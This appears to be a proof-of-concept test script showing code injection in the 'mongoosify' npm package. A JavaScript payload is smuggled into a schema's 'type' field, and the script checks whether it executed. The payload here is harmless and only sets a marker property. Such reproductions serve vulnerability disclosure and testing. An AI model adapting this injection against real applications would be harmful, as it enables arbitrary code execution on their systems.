const {performance} = require('perf_hooks');
let t0 = performance.now();

done = function done(){
    console.log("Done!");
};

var payload = 'console[\"my-awesome-prop-23-42\"] = 23;';

var mongoosify = require('mongoosify');
var mySchema = mongoosify({
    "type":"object",
    "properties":{
        "lastName":{"type":"String;" + payload}
    }
});

if (console["my-awesome-prop-23-42"]){
    console.log("payload was delivered");
} else {
    console.log("payload NOT delivered");
}

let t1 = performance.now();
let mem = process.memoryUsage().heapUsed / 1024 / 1024;
console.log((t1 - t0)/1000);
console.log(Math.round(mem * 100) / 100);



